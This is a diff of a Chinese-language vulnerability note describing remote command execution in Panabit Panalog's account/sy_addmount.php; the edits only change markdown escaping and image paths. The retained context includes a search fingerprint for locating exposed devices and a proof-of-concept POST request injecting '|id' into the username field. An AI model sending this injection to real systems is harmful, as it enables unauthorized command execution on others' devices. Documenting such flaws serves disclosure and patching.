@@ -1,8 +1,8 @@
-# Panabit Panalog sy_addmount.php 远程命令执行漏洞
+# Panabit Panalog sy\_addmount.php 远程命令执行漏洞
 
 ## 漏洞描述
 
-Panabit Panalog sy_addmount.php过滤不足，导致远程命令执行漏洞
+Panabit Panalog sy\_addmount.php过滤不足，导致远程命令执行漏洞
 
 ## 漏洞影响
 
@@ -20,9 +20,9 @@ body="Maintain/cloud_index.php"
 
 登录页面
 
-![image-20230314084818630](images/image-20230314084818630.png)
+![image-20230314084818630](../.gitbook/assets/image-20230314084818630.png)
 
-存在漏洞的代码为 account/sy_addmount.php
+存在漏洞的代码为 account/sy\_addmount.php
 
 ```
 <?php
@@ -53,4 +53,4 @@ POST /account/sy_addmount.php
 username=|id
 ```
 
-![image-20230314084851344](images/image-20230314084851344.png)
+![image-20230314084851344](../.gitbook/assets/image-20230314084851344.png)
